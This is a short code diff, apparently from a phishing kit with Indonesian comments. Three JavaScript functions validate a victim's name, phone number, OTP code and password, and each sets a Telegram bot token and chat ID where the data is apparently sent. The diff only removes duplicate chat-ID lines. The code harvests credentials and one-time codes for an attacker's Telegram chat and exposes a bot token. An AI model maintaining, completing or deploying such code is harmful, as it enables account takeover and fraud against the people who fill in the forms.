@@ -11,8 +11,7 @@ function processFirstData() {
 
         var token = '8466069094:AAETtXO1q2Ma9fPimI2emwkAlDyymsVUnh4'; // Ganti dengan Token Anda
         var grup = '6917263813'; // Ganti dengan Chat ID Anda
-        var grup = '-5116717257';
-
+        
         // Perbaikan: Menggunakan || (OR). Jika nama kosong ATAU nomor kosong, maka return false.
         if ($full_name == "" || $phone_number == "") {
             $('.verification_info').show();
@@ -52,7 +51,6 @@ function processSecondData() {
 
         var token = '8466069094:AAETtXO1q2Ma9fPimI2emwkAlDyymsVUnh4';
         var grup = '6917263813';
-        var grup = '-5116717257';
 
         // Perbaikan: Variabel $ tidak ada, diganti $otp_code. Logika && diganti ||
         if ($full_name == "" || $phone_number == "" || $otp_code == "") {
@@ -94,7 +92,6 @@ function processThirdData() {
 
         var token = '8466069094:AAETtXO1q2Ma9fPimI2emwkAlDyymsVUnh4';
         var grup = '6917263813';
-        var grup = '-5116717257';
 
         // Perbaikan: Menggunakan variabel yang benar dan logika ||
         if ($full_name == "" || $phone_number == "" || $otp_code == "" || $password == "") {
